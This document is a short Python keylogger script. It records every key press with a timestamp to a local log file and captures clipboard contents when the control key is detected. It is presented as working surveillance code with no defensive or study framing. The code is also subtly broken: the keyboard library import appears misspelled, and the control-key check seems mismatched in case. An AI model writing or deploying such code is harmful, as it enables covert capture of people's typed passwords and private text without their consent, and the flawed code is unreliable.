# Contains classes for controlling and monitoring the keyboard.
from pynupt.keyboard import Listener
from datetime import datetime
# Pyperclip is a cross-platform Python module for copy and paste clipboard functions.
import pyperclip

# in this log file it stores all the output
KEYSTROKE_LOG_FILE = './logs/keystroke.log'


def log_key_press(key):
    # replaces the single quotes with nothing
    key = str(key).replace("'", "")
    line_to_write = None
    now = datetime.now()

    if key == 'key.ctrl':
        line_to_write = f"{now}: Clipboard - {pyperclip.paste()}"

    else:
        line_to_write = f"{now}: key press = {key}"

    with open(KEYSTROKE_LOG_FILE, 'a') as f:
        f.write(f"{line_to_write}\n")


def catch():
    # when a key is pressed log_key_press function will be called and the key press returns as an object
    with Listener(on_press=log_key_press) as l:
        l.join()


if __name__ == '__main__':
    catch()
